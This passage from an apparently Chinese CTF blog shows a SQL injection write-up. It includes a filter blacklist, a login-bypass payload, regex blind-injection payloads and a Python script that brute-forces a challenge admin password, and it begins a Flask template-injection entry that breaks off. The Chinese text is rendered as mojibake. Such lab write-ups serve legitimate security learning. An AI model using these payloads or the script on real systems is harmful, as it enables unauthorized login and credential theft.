&#x27;DELETE&#x27;, &#x27;DROP&#x27;, &#x27;%df&#x27;, &#x27;ON&#x27;, &#x27;extractvalue&#x27;, &#x27;OUTFILE&#x27;, &#x27;RENAME&#x27;, &#x27;REPLACE&#x27;, &#x27;SCHEMA&#x27;, &#x27;SET&#x27;, &#x27;updatexml&#x27;, &#x27;SHOW&#x27;, &#x27;SQL&#x27;, &#x27;THEN&#x27;, &#x27;TRUE&#x27;, &#x27;&#x27;, &#x27;UPDATE&#x27;, &#x27;VALUES&#x27;, &#x27;VERSION&#x27;, &#x27;WHEN&#x27;, &#x27;/*&#x27;, &#x27;`&#x27;, &#x27;%0a%0A&#x27;, &#x27;%0b&#x27;, &#x27;REGEXP&#x27;, &#x27;count&#x27;, &#x27;%0c&#x27;, &#x27;from&#x27;, &#x27;%0d&#x27;, &#x27;%a0&#x27;, &#x27;@&#x27;, &#x27;else%27%23%22%20&#x27;, &#x27;/**/&#x27;, &#x27;regexp&#x27;,&#x27;%&#x27;,&#x27;\&#x27;]<br></code></pre></td></tr></table></figure><h3 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ ¹æ®é»‘é©¬å•æ•°æ®ï¼Œæˆ‘ä»¬å‘ç°ç½‘ç«™è¿‡æ»¤äº†select,ä¸”é‡‡ç”¨äº†å¤§å°å†™è¿‡æ»¤ï¼Œè¿™é‡Œæ— æ³•ä½¿ç”¨å¸¸ç”¨çš„ç›²æ³¨payloadè·å–åˆ°æ•°æ®åº“ä¿¡æ¯äº†ï¼Œä½†æ˜¯regexpæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘é‡‡ç”¨æ­£åˆ™æ³¨å…¥ã€‚<br><br>å¸¸ç”¨çš„æ³¨é‡Šè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å°±ç”¨;%00ä»£æ›¿ï¼š<br><br>&#x27;è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆç”¨æ¥é—­åˆå¤šä½™&#x27;å°±åªèƒ½ç”¨\,è½¬ä¹‰å­—ç¬¦è¿›è¡Œä»£æ›¿<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨è½¬ä¹‰å­—ç¬¦å’Œä¸‡èƒ½å¯†é’¥ç™»å½•ç³»ç»Ÿ"><a href="#ä½¿ç”¨è½¬ä¹‰å­—ç¬¦å’Œä¸‡èƒ½å¯†é’¥ç™»å½•ç³»ç»Ÿ" class="headerlink" title="ä½¿ç”¨è½¬ä¹‰å­—ç¬¦å’Œä¸‡èƒ½å¯†é’¥ç™»å½•ç³»ç»Ÿ:"></a>ä½¿ç”¨è½¬ä¹‰å­—ç¬¦å’Œä¸‡èƒ½å¯†é’¥ç™»å½•ç³»ç»Ÿ:</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†:"></a>åŸç†:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from beansystemuser where 1<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205164932685.png" alt="image-20240205164932685"></p><h3 id="æ„é€ sqlè¯­å¥å®ç°ç™»å½•"><a href="#æ„é€ sqlè¯­å¥å®ç°ç™»å½•" class="headerlink" title="æ„é€ sqlè¯­å¥å®ç°ç™»å½•:"></a>æ„é€ sqlè¯­å¥å®ç°ç™»å½•:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from users where username=&#x27;\&#x27; and passwd=&#x27; || 1;%00&#x27;<br>=&gt;ç”±äºè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥è¦è¿›è¡Œç»•è¿‡<br>select * from users where username=&#x27;\&#x27; and passwd=&#x27;/**/||/**/1;%00&#x27;<br></code></pre></td></tr></table></figure><h4 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod:"></a>paylaod:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=\&amp;passwd=||/**/1;%00<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205165314530.png" alt="image-20240205165314530"></p><p>æˆåŠŸå›æ˜¾é¡µé¢ï¼ŒåŒæ—¶è·å–åˆ°å“åº”é¡µé¢å®šä½åˆ°welcome.phpé¡µé¢æ˜¾ç¤º</p><h4 id="welcome-php"><a href="#welcome-php" class="headerlink" title="welcome.php:"></a>welcome.php:</h4><p><img src="/images/2024-2-18/image-20240205165536457.png" alt="image-20240205165536457"></p><p>è¿˜æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå› ä¸ºæ ¹æ®hint.txtçš„æç¤ºï¼Œæˆ‘ä»¬çš„å¯†ç éœ€è¦æ˜¯adminè´¦æˆ·çš„å¯†ç æ‰å¯ä»¥ï¼Œæ‰€ä»¥æ²¡è¿”å›æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬è‡³å°‘æ”¶é›†åˆ°å¦‚æœæˆ‘ä»¬çš„å‚æ•°è¾“å…¥ä½¿å¾—sqlè¯­å¥æœ‰è¿”å›ç»“æœï¼Œå°±ä¼šæœ‰welcome.phpçš„ä¿¡æ¯æ˜¾ç¤ºã€‚</p><h2 id="æ­£åˆ™æ³¨å…¥"><a href="#æ­£åˆ™æ³¨å…¥" class="headerlink" title="æ­£åˆ™æ³¨å…¥:"></a>æ­£åˆ™æ³¨å…¥:</h2><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†:"></a>åŸç†:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">regexp:<br>REGEXP æ˜¯ MySQL ä¸­ç”¨äºè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ“ä½œç¬¦ã€‚ä½¿ç”¨ REGEXP å¯ä»¥åœ¨æŸ¥è¯¢ä¸­è¿›è¡Œæ¨¡å¼åŒ¹é…ï¼Œä»¥æŸ¥æ‰¾æ»¡è¶³ç‰¹å®šæ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚<br>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•åœ¨ MySQL ä¸­ä½¿ç”¨ REGEXPï¼š<br>SELECT * FROM your_table<br>WHERE your_column REGEXP &#x27;pattern&#x27;;<br><br>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œyour_table æ˜¯æ‚¨è¦æŸ¥è¯¢çš„è¡¨åï¼Œyour_column æ˜¯è¦è¿›è¡ŒåŒ¹é…çš„åˆ—åï¼Œè€Œ &#x27;pattern&#x27; åˆ™æ˜¯æ‚¨å¸Œæœ›è¿›è¡ŒåŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ã€‚<br>ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æƒ³æŸ¥æ‰¾ your_column ä¸­ä»¥å­—æ¯ &quot;a&quot; å¼€å¤´çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š<br>SELECT * FROM your_table<br>WHERE your_column REGEXP &#x27;^a&#x27;;<br>è¿™å°†è¿”å›æ‰€æœ‰ä»¥å­—æ¯ &quot;a&quot; å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚<br></code></pre></td></tr></table></figure><h3 id="æµ‹è¯•å®ä¾‹"><a href="#æµ‹è¯•å®ä¾‹" class="headerlink" title="æµ‹è¯•å®ä¾‹:"></a>æµ‹è¯•å®ä¾‹:</h3><h4 id="sql1"><a href="#sql1" class="headerlink" title="sql1:"></a>sql1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from information_schema.tables <br>where table_schema=&quot;testforweb&quot; and table_name REGEXP &quot;^b&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205230905461.png" alt="image-20240205230905461"></p><p>æ€»å…±å›æ˜¾ä¸‰æ¡è®°å½•</p><h4 id="sql1-1"><a href="#sql1-1" class="headerlink" title="sql1_1:"></a>sql1_1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">select 1 from information_schema.tables <br>where table_schema=&quot;testforweb&quot; and table_name REGEXP &quot;^b&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205231038166.png" alt="image-20240205231038166"></p><p>ä¹Ÿå›æ˜¾ä¸‰æ¡è®°å½•</p><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ•°æ®åº“çš„è¿è¡Œé€»è¾‘æ˜¯å…ˆè¿è¡Œfromåé¢æ‰€æœ‰çš„å†…å®¹ï¼Œæ»¡è¶³fromåé¢çš„æ¡ä»¶ä¹‹åï¼Œåœ¨æ‰§è¡Œselectçš„å†…å®¹ï¼Œæ‰€ä»¥fromåé¢å¤šå°‘æ¡è®°å½•ï¼Œselectå°±æ‰“å°å¤šå°‘æ¡è®°å½•ï¼Œæ‰“å°å†…å®¹å–å†³äºselect å’Œ fromä¹‹é—´çš„å†…å®¹ï¼Œå¦‚æœæ˜¯fromåé¢äº§ç”Ÿçš„è™šæ‹Ÿè¡¨çš„å­—æ®µï¼Œåˆ™æ‰“å°å­—æ®µå†…å®¹ï¼Œå¦‚æœæ˜¯å¸¸é‡ï¼Œåˆ™ç›´æ¥æ‰“å°å¸¸é‡<br></code></pre></td></tr></table></figure><h4 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•:"></a>æµ‹è¯•:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select 1 from beansystemuser<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205231804893.png" alt="image-20240205231804893"></p><p>beansystemuserè¡¨æ€»å…±æœ‰4æ¡è®°å½•ï¼Œè¯¥sqlè¯­å¥å°±æ‰“å°4ä¸ª1</p><p>æ‰€ä»¥å¯ä»¥å­˜åœ¨ä»¥ä¸‹ç›²æ³¨payload</p><h3 id="ç›²æ³¨payload"><a href="#ç›²æ³¨payload" class="headerlink" title="ç›²æ³¨payload:"></a>ç›²æ³¨payload:</h3><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h4><p><strong>selectå¯ç”¨:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">//åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦åœ¨a-zä¹‹é—´<br>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#x27;^[a-z]&#x27; LIMIT 0,1) /*<br>//REGEXP &#x27;^[a-z]&#x27;å³æ˜¯åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼Œ^è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ï¼Œ[a-z]å³åŒ¹é…å­—æ¯a-z<br><br>å¦‚æœè¾“å‡ºçš„ç¬¬ä¸€å¼ è¡¨çš„åç§°åŒ¹é…æ˜¯ä»¥a-zçš„å­—ç¬¦å¼€å¤´çš„è¯ï¼Œå°±ä¼šè¿”å›ä¸€ä¸ª1ï¼Œä»è€Œå½¢æˆ1=1<br><br>å‡å¦‚çŸ¥é“ç¬¬ä¸€å¼ è¡¨åç§°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºc,åˆ™è·å–æ¥ä¸‹æ¥çš„å­—ç¬¦å°±æ˜¯:<br>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#x27;^c&#123;&#125;&#x27; LIMIT 0,1) /*<br><br>&#123;&#125;ä¸ºä»»æ„åˆæ³•çš„è¡¨åå­—ç¬¦ï¼Œå³é€šè¿‡è¿™ç§æ–¹å¼ä¸€æ­¥ä¸€æ­¥çš„æ¨å‡ºè¡¨åï¼Œç±»ä¼¼likeå’Œ=çš„ç›²æ³¨<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥ç”¨ä»¥ä¸Špayloadæ„é€ å‡ºç”¨äºè·å–è¡¨åï¼Œå­—æ®µåï¼Œå­—æ®µå€¼çš„payload,ä½†æ˜¯ä»¥ä¸Špayloadåªèƒ½ç”¨äºselectå¯ç”¨çš„æƒ…å†µï¼Œå½“selectå¯ä»¥ç”¨æ—¶å…¶å®å¯ä»¥ç›´æ¥ä½¿ç”¨æ™®é€šçš„ç›²æ³¨è„šæœ¬ä»¥åŠæ—¶é—´è„šæœ¬ã€‚</p><h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h4><p><strong>selectä¸å¯ç”¨ï¼Œä½†æ˜¯çŸ¥é“ï¼ˆå¯ä»¥çŒœæµ‹ï¼‰æŸ¥è¯¢çš„å­—æ®µåæ—¶ï¼Œç›´æ¥çˆ†ç ´å­—æ®µå€¼</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç¤ºä¾‹:<br>select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;<br>è¿™å¥sqlè¯­å¥ç›´æ¥å‘Šè¯‰æˆ‘ä»¬usersè¡¨ä¸­çš„ä¸¤ä¸ªå­—æ®µusernameå’Œpasswd,æ‰€ä»¥å¯ä»¥é€šè¿‡æ„é€ ä»¥ä¸‹sqlç›´æ¥çˆ†ç ´è·å–è¿™ä¸¤ä¸ªå­—æ®µçš„å€¼:<br>username = &#x27;123 || passwd regexp &quot;^&#123;&#125;&quot; /*&#x27; and passwd=&#x27;123&#x27;<br>username = &#x27;123 || username regexp &quot;^&#123;&#125;&quot; /*&#x27; and passwd=&#x27;123&#x27;<br>æˆ–<br>username = &#x27;1\&#x27; and passwd=&#x27; || passwd regexp &quot;^&#123;&#125;&quot; /*&#x27;<br>username = &#x27;1\&#x27; and passwd=&#x27; || username regexp &quot;^&#123;&#125;&quot; /*&#x27;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå±€é™åœ¨äºæˆ‘ä»¬åªèƒ½çˆ†ç ´å·²çŸ¥çš„æˆ–çŒœæµ‹æ­£ç¡®çš„å­—æ®µå€¼ï¼Œä¸èƒ½çˆ†ç ´ä»»æ„å­—æ®µçš„å†…å®¹ã€‚è¿™ä¸ªpayloadä¹Ÿå¯ä»¥ç”¨&#x3D;å’Œlikeè¿›è¡Œæ›¿æ¢ã€‚</p><h2 id="æ ¹æ®æ­£åˆ™æ³¨å…¥çš„payload2æ„é€ è„šæœ¬"><a href="#æ ¹æ®æ­£åˆ™æ³¨å…¥çš„payload2æ„é€ è„šæœ¬" class="headerlink" title="æ ¹æ®æ­£åˆ™æ³¨å…¥çš„payload2æ„é€ è„šæœ¬:"></a>æ ¹æ®æ­£åˆ™æ³¨å…¥çš„payload2æ„é€ è„šæœ¬:</h2><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹:"></a>æ³¨æ„äº‹é¡¹:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ^a$ è¡¨ç¤ºä¸€ä¸ªç²¾ç¡®åŒ¹é…çš„æ¨¡å¼ï¼Œå®ƒåªåŒ¹é…ä»¥å­—æ¯ &quot;a&quot; å¼€å¤´ä¸”ä»¥å­—æ¯ &quot;a&quot; ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚<br><br>å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š<br><br>^ï¼šè¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ã€‚<br>aï¼šè¡¨ç¤ºåŒ¹é…å­—æ¯ &quot;a&quot;ã€‚<br>$ï¼šè¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚<br>å› æ­¤ï¼Œ^a$ åªä¼šåŒ¹é…å•ä¸ªå­—ç¬¦ &quot;a&quot;ï¼Œè€Œä¸ä¼šåŒ¹é…ä»»ä½•å…¶ä»–å­—ç¬¦ä¸²ã€‚è¿™æ„å‘³ç€å¦‚æœè¦åŒ¹é…ä¸€ä¸ªå®Œå…¨ç­‰äº &quot;a&quot; çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ ^a$ æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ã€‚<br><br>æ‰€ä»¥å½“å‡ºç°åŒ¹é…çš„å­—ç¬¦ä¸²ä¸­æœ‰$æ—¶ï¼Œè¯´æ˜å­—æ®µå€¼å·²ç»åŒ¹é…å®Œæˆ<br></code></pre></td></tr></table></figure><h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬:"></a>è„šæœ¬:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-comment"># header=&#123;</span><br>        <span class="hljs-comment">#     &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&#x27;,</span><br>        <span class="hljs-comment">#     &#x27;Origin&#x27;: &#x27;http://2a76f9bd-c19c-4d74-9385-12c43d39a140.node3.buuoj.cn&#x27;,</span><br>        <span class="hljs-comment">#     &#x27;Referer&#x27;: &#x27;http://2a76f9bd-c19c-4d74-9385-12c43d39a140.node3.buuoj.cn/index.php&#x27;</span><br>        <span class="hljs-comment"># &#125;</span><br><br><span class="hljs-comment"># ç”±äºæ˜¯ç±»ä¼¼ç­‰äºçš„æ¯”è¾ƒæ–¹å¼ï¼Œæ‰€ä»¥é‡‡ç”¨ç›´æ¥éå†ï¼Œä¸ç”¨äºŒåˆ†æ³•</span><br>s = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;(),-./:;&lt;=&gt;@[\]_`&#123;|&#125;~&#x27;</span><br><br>url = <span class="hljs-string">&#x27;http://3837f8c5-85b2-4601-b191-adb8d95e9524.node5.buuoj.cn:81/index.php&#x27;</span><br><br>corret_context = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-comment"># æŸ¥æ‰¾åŒ¹é…å½“å‰å­—ç¬¦</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># data = &#123;&#x27;passwd&#x27;:&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format(corret_context+j, parse.unquote(&#x27;%00&#x27;)),&quot;username&quot;:&quot;\\&quot;&#125;</span><br>        <span class="hljs-comment"># ç”±äº%00ä¸èƒ½ç›´æ¥ä¼ å‚ï¼Œå¦åˆ™è§£ç ä¸ºç©ºï¼Œæ‰€ä»¥éœ€è¦ç”¨parse.unquote(&#x27;%00&#x27;)ä¼ å‚ï¼Œurlä¼ å‚çš„åŸºæœ¬è¦æ±‚</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>            <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;0&#125;\&quot;;&#123;1&#125;&quot;</span>.<span class="hljs-built_in">format</span>(corret_context+j, parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))<br>        &#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å½“å‰è¿›åº¦:&#123;&#125;% &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i,data))<br>        <span class="hljs-comment"># r = requests.post(url=url, data=data,headers=header)</span><br>        r = requests.post(url=url, data=data)<br>        time.sleep(<span class="hljs-number">0.04</span>)<br>        true_text = <span class="hljs-string">&quot;welcome.php&quot;</span><br>        <span class="hljs-keyword">if</span> true_text <span class="hljs-keyword">in</span> r.text:<br>            corret_context += j<br>            <span class="hljs-built_in">print</span>(corret_context)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦å·²ç»å…¨éƒ¨åŒ¹é…ï¼Œæœ‰æ—¶å€™æ­£ç¡®çš„å­—æ®µå€¼å¯èƒ½ä¼šæœ‰$,æ‰€ä»¥è¦é…Œæƒ…è€ƒè™‘</span><br>    <span class="hljs-keyword">if</span> corret_context.endswith(<span class="hljs-string">&quot;$&quot;</span>):<br>            corret_context = corret_context[:-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;corret_context:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(corret_context))<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2024-2-18/image-20240206003746260.png" alt="image-20240206003746260"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">you_will_never_know7788990$<br>corret_context:you_will_never_know7788990<br></code></pre></td></tr></table></figure><h2 id="ç™»å½•é¡µé¢"><a href="#ç™»å½•é¡µé¢" class="headerlink" title="ç™»å½•é¡µé¢:"></a>ç™»å½•é¡µé¢:</h2><p><strong>ç”±äºé»‘åå•ä¸­ä¹Ÿè¿‡æ»¤äº†adminæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨admi&#x2F;**&#x2F;nç»•è¿‡é»‘åå•ï¼Œä½†æ˜¯usernameåœ¨sqlæŸ¥è¯¢æ—¶ä¾ç„¶ä»¥adminè¿›è¡ŒæŸ¥è¯¢ï¼Œä¸å—å½±å“ã€‚</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admi/**/n<br>&amp;passwd=you_will_never_know7788990<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206002553833.png" alt="image-20240206002553833"></p><p>flag&#x3D;flag{1e629120-8e86-40d2-9281-fd0ded2d4383}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[RootersCTF2019]I_&lt;3_Flask</title>
    <link href="/2024/02/18/2024-02-18-%5BRootersCTF2019%5DI3_Flask/"/>
    <url>/2024/02/18/2024-02-18-%5BRootersCTF2019%5DI3_Flask/</url>
    
    <content type="html"><![CDATA[<h1 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ:"></a>å‚è€ƒ:</h2><p>[<a href="https://blog.csdn.net/fmyyy1/article/details/115715212">RootersCTF2019]I_ï¼œ3_Flask_[rootersctf2019]i_&lt;3_flask 1-CSDNåšå®¢</a></p><h2 id="è®¿é—®ç½‘é¡µ"><a href="#è®¿é—®ç½‘é¡µ" class="headerlink" title="è®¿é—®ç½‘é¡µ:"></a>è®¿é—®ç½‘é¡µ:</h2><p><img src="/images/2024-2-18/image-20240205134548008.png" alt="image-20240205134548008"></p><p>é¢˜ç›®æ˜¯flaskæ¡†æ¶å¼€å‘çš„ï¼Œè¿™é‡ŒæŸ¥æ‰¾app.pyï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼ŒæŠ“åŒ…ä¹Ÿæ²¡æœ‰å‘ç°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬è¦å¯¹ç½‘é¡µè¿›è¡Œæ¶æ„æ“ä½œæ—¶ï¼Œå¿…é¡»å­˜åœ¨ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ›´æ”¹çš„æ³¨å…¥ç‚¹ï¼Œä¸€èˆ¬ä¸ºç½‘é¡µçš„å‚æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬é€šè¿‡å¯¹ç½‘é¡µçš„ä¿¡æ¯æŸ¥æ‰¾æ²¡æœ‰å‘ç°å¯ç–‘å‚æ•°ï¼Œä½†æ˜¯çŒœæµ‹å®ƒæ˜¯flaskæ¡†æ¶çš„æ¨¡æ¿æ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…·å¯¹è¯¥ç½‘é¡µçš„å‚æ•°è¿›è¡Œçˆ†ç ´ã€‚</p><h2 id="å‚æ•°çˆ†ç ´å·¥å…·-Arjun"><a href="#å‚æ•°çˆ†ç ´å·¥å…·-Arjun" class="headerlink" title="å‚æ•°çˆ†ç ´å·¥å…·:Arjun"></a>å‚æ•°çˆ†ç ´å·¥å…·:Arjun</h2><p><a href="https://blog.csdn.net/Alexhcf/article/details/108294645">Arjunï¼šä¸€æ¬¾httpå‚æ•°æ‰«æå™¨çš„ä½¿ç”¨_arjunä½¿ç”¨-CSDNåšå®¢</a></p><h3 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½:"></a>ä¸‹è½½:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">git clone https://github.com/s0md3v/Arjun.git<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205135826164.png" alt="image-20240205135826164"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">python3 setup.py install<br></code></pre></td></tr></table></figure><h4 id="å¿½ç•¥è­¦å‘Š"><a href="#å¿½ç•¥è­¦å‘Š" class="headerlink" title="å¿½ç•¥è­¦å‘Š:"></a>å¿½ç•¥è­¦å‘Š:</h4><p>å¦‚æœåœ¨pipä¸­å‡ºç°rootè­¦å‘Šï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ“ä½œå¿½ç•¥</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pip install --root-user-action=ignore arjun<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205140435766.png" alt="image-20240205140435766"></p><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" 